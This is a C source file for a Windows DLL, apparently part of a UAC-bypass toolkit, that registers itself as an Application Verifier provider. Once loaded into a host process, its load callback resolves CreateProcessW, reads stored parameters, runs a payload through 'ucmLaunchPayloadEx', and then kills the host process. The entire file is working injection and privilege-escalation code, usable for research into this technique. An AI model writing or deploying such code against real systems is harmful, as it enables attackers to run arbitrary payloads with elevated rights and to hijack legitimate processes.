/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2017
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     2.80
*
*  DATE:        06 Sept 2017
*
*  AVrf entry point, Hibiki Kai Ni.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

//disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 6102) // Using %s from failed function call at line %u

#include <windows.h>
#include <ntstatus.h>
#include "shared\ntos.h"
#include "shared\minirtl.h"
#include "shared\util.h"

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define LoadedMsg      "Hibiki lock and loaded"

#define DLL_PROCESS_VERIFIER 4

typedef VOID(NTAPI * RTL_VERIFIER_DLL_LOAD_CALLBACK) (PWSTR DllName, PVOID DllBase, SIZE_T DllSize, PVOID Reserved);

typedef struct _RTL_VERIFIER_THUNK_DESCRIPTOR {
    PCHAR ThunkName;
    PVOID ThunkOldAddress;
    PVOID ThunkNewAddress;
} RTL_VERIFIER_THUNK_DESCRIPTOR, *PRTL_VERIFIER_THUNK_DESCRIPTOR;

typedef struct _RTL_VERIFIER_DLL_DESCRIPTOR {
    PWCHAR DllName;
    DWORD DllFlags;
    PVOID DllAddress;
    PRTL_VERIFIER_THUNK_DESCRIPTOR DllThunks;
} RTL_VERIFIER_DLL_DESCRIPTOR, *PRTL_VERIFIER_DLL_DESCRIPTOR;

typedef struct _RTL_VERIFIER_PROVIDER_DESCRIPTOR {
    DWORD Length;
    PRTL_VERIFIER_DLL_DESCRIPTOR ProviderDlls;
    RTL_VERIFIER_DLL_LOAD_CALLBACK ProviderDllLoadCallback;
    PVOID ProviderDllUnloadCallback;
    PWSTR VerifierImage;
    DWORD VerifierFlags;
    DWORD VerifierDebug;
    PVOID RtlpGetStackTraceAddress;
    PVOID RtlpDebugPageHeapCreate;
    PVOID RtlpDebugPageHeapDestroy;
    PVOID ProviderNtdllHeapFreeCallback;
} RTL_VERIFIER_PROVIDER_DESCRIPTOR, *PRTL_VERIFIER_PROVIDER_DESCRIPTOR;

static RTL_VERIFIER_PROVIDER_DESCRIPTOR g_avrfProvider;
static RTL_VERIFIER_THUNK_DESCRIPTOR avrfThunks[2];
static RTL_VERIFIER_DLL_DESCRIPTOR avrfDlls[2];
static HMODULE g_pvKernel32;

PFNCREATEPROCESSW pCreateProcessW = NULL;

/*
* ucmLoadCallback
*
* Purpose:
*
* Image load notify callback, when kernel32 available - acquire import and run target application.
*
*/
VOID NTAPI ucmLoadCallback(
    PWSTR DllName,
    PVOID DllBase,
    SIZE_T DllSize,
    PVOID Reserved
)
{
    BOOL bReadSuccess, bIsLocalSystem = FALSE;

    PWSTR lpParameter = NULL;
    ULONG cbParameter = 0L;

    UNREFERENCED_PARAMETER(DllSize);
    UNREFERENCED_PARAMETER(Reserved);

    if (DllName == NULL) {
        return;
    }

    if (_strcmpi(DllName, L"kernel32.dll") == 0) {
        g_pvKernel32 = DllBase;
    }

    if (_strcmpi(DllName, L"user32.dll") == 0) {
        if (g_pvKernel32) {
            
            pCreateProcessW = ucmLdrGetProcAddress(
                (PCHAR)g_pvKernel32, 
                "CreateProcessW");

            if (pCreateProcessW != NULL) {

                ucmIsLocalSystem(&bIsLocalSystem);

                bReadSuccess = ucmReadParameters(
                    &lpParameter,
                    &cbParameter,
                    NULL,
                    NULL,
                    bIsLocalSystem);

                ucmLaunchPayloadEx(
                    pCreateProcessW,
                    lpParameter,
                    cbParameter);

                if ((bReadSuccess) && 
                    (lpParameter != NULL)) 
                {
                    RtlFreeHeap(
                        NtCurrentPeb()->ProcessHeap,
                        0,
                        lpParameter);
                }

                NtTerminateProcess(NtCurrentProcess(), STATUS_SUCCESS);
            }
        }
    }
}

/*
* ucmRegisterProvider
*
* Purpose:
*
* Register provider and set up image load notify callback.
*
*/
VOID ucmRegisterProvider(
    VOID
)
{
    RtlSecureZeroMemory(&avrfThunks, sizeof(avrfThunks)); //for future case

    avrfThunks[0].ThunkName = NULL;
    avrfThunks[0].ThunkOldAddress = NULL;
    avrfThunks[0].ThunkNewAddress = NULL;

    RtlSecureZeroMemory(&avrfDlls, sizeof(avrfDlls)); //for future case

    avrfDlls[0].DllName = NULL;
    avrfDlls[0].DllFlags = 0;
    avrfDlls[0].DllAddress = NULL;
    avrfDlls[0].DllThunks = avrfThunks;

    RtlSecureZeroMemory(&g_avrfProvider, sizeof(RTL_VERIFIER_PROVIDER_DESCRIPTOR));
    g_avrfProvider.Length = sizeof(RTL_VERIFIER_PROVIDER_DESCRIPTOR);
    g_avrfProvider.ProviderDlls = avrfDlls;
    g_avrfProvider.ProviderDllLoadCallback = (RTL_VERIFIER_DLL_LOAD_CALLBACK)&ucmLoadCallback;
}

/*
* DllMain
*
* Purpose:
*
* Verifier dll entry point, register verifier provider.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    PRTL_VERIFIER_PROVIDER_DESCRIPTOR* pVPD = lpvReserved;

    UNREFERENCED_PARAMETER(hinstDLL);

    switch (fdwReason) {

    case DLL_PROCESS_VERIFIER:
        DbgPrint(LoadedMsg);
        ucmRegisterProvider();
        *pVPD = &g_avrfProvider;
        break;
    }
    return TRUE;
}
